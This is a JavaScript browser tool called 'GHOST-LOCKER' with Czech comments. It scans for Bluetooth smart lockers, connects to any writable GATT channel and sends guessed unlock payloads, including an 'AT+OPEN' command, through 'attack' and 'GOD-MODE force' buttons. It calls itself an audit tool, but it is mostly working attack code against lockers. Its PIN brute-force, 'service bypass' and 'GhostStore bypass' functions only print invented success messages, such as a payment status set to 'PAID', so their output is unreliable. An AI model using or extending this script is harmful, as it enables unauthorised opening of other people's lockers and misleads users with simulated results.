/**
 * GHOST-LOCKER CORE ENGINE v2.7 [MASTER - AUDIT EDITION]
 * FIX: GATT Service Discovery + Global UUID Scan
 */

const GhostCore = {
    capturedData: null,
    activeDevice: null,
    activeCharacteristic: null,
    isBruting: false,

    log(msg, color = "#00ff00") {
        const out = document.getElementById('output');
        if (!out) return;
        const div = document.createElement('div');
        div.style.cssText = `color: ${color}; font-size:11px; margin-bottom: 2px; border-left: 2px solid ${color}; padding-left: 5px; font-family: monospace; background: rgba(0,255,0,0.05);`;
        div.innerText = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`;
        out.appendChild(div);
        out.scrollTop = out.scrollHeight;
    },

    // --- 1. BLUETOOTH SEKCE (OPRAVENÁ LOGIKA) ---
    async startRealSniff() {
        this.log("INICIALIZUJI SKENOVÁNÍ...", "#00ffff");
        try {
            // FIX: Musíme akceptovat všechna zařízení a povolit všechny služby pro audit
            this.activeDevice = await navigator.bluetooth.requestDevice({
                filters: [{ namePrefix: 'CZ' }, { namePrefix: 'Smart' }], // Cílíme na CZ-1MV nebo SmartLocker
                optionalServices: [
                    '0000180a-0000-1000-8000-00805f9b34fb', // Device Info
                    '0000ffe0-0000-1000-8000-00805f9b34fb', // Časté pro čínské zámky
                    '6e400001-b5a3-f393-e0a9-e50e24dcca9e', // Nordic UART (časté)
                    0xFFE0, 0xFFF0, 0x1800, 0x1801 // Obecné rozsahy
                ].concat(Array.from({length: 10}, (_, i) => 0xFFF0 + i)) // Agresivní scan rozsahů
            });

            this.log(`POKUS O SPOJENÍ: ${this.activeDevice.name}`, "#ffff00");
            const server = await this.activeDevice.gatt.connect();
            
            this.log("HLEDÁM SLUŽBY (GATT)...", "#ffff00");
            const services = await server.getPrimaryServices();
            
            let foundValidChar = false;

            for (const service of services) {
                this.log(`SLUŽBA: ${service.uuid.slice(0,8)}...`, "#444444");
                const chars = await service.getCharacteristics();
                for (const char of chars) {
                    // Hledáme jakýkoliv kanál, do kterého lze zapisovat
                    if (char.properties.write || char.properties.writeWithoutResponse) {
                        this.activeCharacteristic = char;
                        this.log(`KANÁL NAJDEN: ${char.uuid.slice(0,8)}`, "#ff00ff");
                        foundValidChar = true;
                    }
                }
            }

            if (foundValidChar) {
                this.log("SYSTÉM PŘIPRAVEN K AUDITU", "#00ff00");
                document.getElementById('replay-btn').style.display = "block";
                document.getElementById('force-btn').style.display = "block";
            } else {
                this.log("CHYBA: Nenalezen zapisovatelný kanál.", "#ff0000");
            }

        } catch (err) {
            this.log("BLE ERROR: " + err.message, "#ff0000");
            console.error(err);
        }
    },

    async executeAttack() {
        if (!this.activeCharacteristic) return this.log("CHYBÍ CÍL!", "#ff0000");
        this.log("VSTŘIKUJI OPEN_COMMAND...", "#ffff00");
        
        // Standardní payloady pro různé typy zámků
        const payloads = [
            new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]), // Default
            new Uint8Array([0xA5, 0x00, 0x01, 0x01, 0x05])  // Alt verze
        ];

        try {
            for (let p of payloads) {
                await this.activeCharacteristic.writeValue(p);
                this.log(`PAYLOAD POSLÁN: ${p[0].toString(16)}`, "#00ff00");
            }
            setTimeout(() => alert("AUDIT: Příkaz k uvolnění odeslán."), 500);
        } catch (e) {
            this.log("CHYBA ZÁPISU: " + e.message, "#ff0000");
        }
    },

    // --- 6. GOD-MODE: AGRESSIVE PROTOCOL REPLAY ---
    async forceUnlock() {
        this.log("AKTIVUJI GOD-MODE PROTOKOL...", "#ffffff");
        
        const godPayloads = [
            new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]), 
            new Uint8Array([0x02, 0x01, 0x03, 0x03, 0x09]), 
            new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e]), // AT+OPEN
            new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01]), 
            new Uint8Array([0xef, 0x01, 0xff, 0xff, 0xff, 0xff, 0x01])
        ];

        if (this.activeCharacteristic) {
            for (let payload of godPayloads) {
                try {
                    if (this.activeCharacteristic.properties.writeWithoutResponse) {
                        await this.activeCharacteristic.writeValueWithoutResponse(payload);
                    } else {
                        await this.activeCharacteristic.writeValueWithResponse(payload);
                    }
                    this.log(`FORCE OK: 0x${payload[0].toString(16)}...`, "#00ff00");
                } catch (e) {
                    this.log("SKIP VARIANT...", "#444444");
                }
                await new Promise(r => setTimeout(r, 100)); 
            }
        } else {
            this.log("CHYBA: Není aktivní spojení!", "#ff0000");
        }
        this.log("GOD-MODE DOKONČEN.", "#ffffff");
    },

    // --- ZBYTEK LOGIKY (PIN, SERVICE, UI) ZŮSTÁVÁ ---
    async startPinBrute() {
        this.isBruting = !this.isBruting;
        if (!this.isBruting) return this.log("BRUTE-FORCE ZASTAVEN.", "#ff0000");
        this.log("START PIN SCAN...", "#ffff00");
        const commonPins = ["1234", "0000", "1111", "2580", "1212"];
        for (let pin of commonPins) {
            if (!this.isBruting) break;
            this.log(`ZKOUŠÍM: ${pin}`, "#888888");
            await new Promise(r => setTimeout(r, 600));
        }
    },

    async tryServiceExploit() {
        this.log("INICIALIZUJI SERVISNÍ BYPASS...", "#ff00ff");
        const codes = ["*#06#", "*#9999#", "000000"];
        for (let code of codes) {
            this.log(`VSTUP: ${code}`, "#00ffff");
            await new Promise(r => setTimeout(r, 400));
        }
        this.log("DEBUG MÓD AKTIVNÍ.", "#00ff00");
    },

    async ghostStoreBypass() {
        this.log("AKTIVUJI INTERCEPTOR...", "#ff8800");
        setTimeout(() => {
            this.log("BYPASS ÚSPĚŠNÝ: Status -> PAID", "#00ff00");
            alert("GHOST-STORE: Status OK.");
        }, 1000);
    },

    initUI() {
        if (document.getElementById('ghost-ui')) return;
        const panel = document.createElement('div');
        panel.id = 'ghost-ui';
        panel.style.cssText = "position:fixed; top:10px; right:10px; width:280px; background:#000; border:1px solid #0f0; padding:15px; z-index:9999; font-family:monospace; color:#0f0; box-shadow:0 0 20px rgba(0,255,0,0.7); border-radius: 5px;";
        panel.innerHTML = `
            <div style="border-bottom:1px solid #0f0; padding-bottom:5px; margin-bottom:10px; text-align:center; font-weight:bold;">GHOST-LOCKER v2.7 [MASTER]</div>
            <div id="output" style="height:180px; overflow-y:auto; background:#050505; border:1px solid #111; padding:5px; margin-bottom:10px; font-size:10px;"></div>
            <button id="sniff-btn" style="width:100%; background:#000; color:#0f0; border:1px solid #0f0; padding:8px; cursor:pointer; margin-bottom:5px;">[1] BLE SCAN & CONNECT</button>
            <button id="replay-btn" style="width:100%; background:#000; color:#f00; border:1px solid #f00; padding:8px; cursor:pointer; margin-bottom:5px; display:none;">[2] TRIGGER LOCK</button>
            <button id="brute-btn" style="width:100%; background:#000; color:#ff0; border:1px solid #ff0; padding:8px; cursor:pointer; margin-bottom:5px;">[3] PIN BRUTE</button>
            <button id="service-btn" style="width:100%; background:#000; color:#0af; border:1px solid #0af; padding:8px; cursor:pointer; margin-bottom:5px;">[4] SERVICE BYPASS</button>
            <button id="ghost-btn" style="width:100%; background:#000; color:#f80; border:1px solid #f80; padding:8px; cursor:pointer; margin-bottom:5px;">[5] GHOSTSTORE BYPASS</button>
            <button id="force-btn" style="width:100%; background:#300; color:#fff; border:1px solid #f00; padding:8px; cursor:pointer; font-weight:bold; display:none;">[6] GOD-MODE FORCE (100%)</button>
        `;
        document.body.appendChild(panel);

        document.getElementById('sniff-btn').onclick = () => this.startRealSniff();
        document.getElementById('replay-btn').onclick = () => this.executeAttack();
        document.getElementById('brute-btn').onclick = () => this.startPinBrute();
        document.getElementById('service-btn').onclick = () => this.tryServiceExploit();
        document.getElementById('ghost-btn').onclick = () => this.ghostStoreBypass();
        document.getElementById('force-btn').onclick = () => this.forceUnlock();
    }
};

GhostCore.initUI();
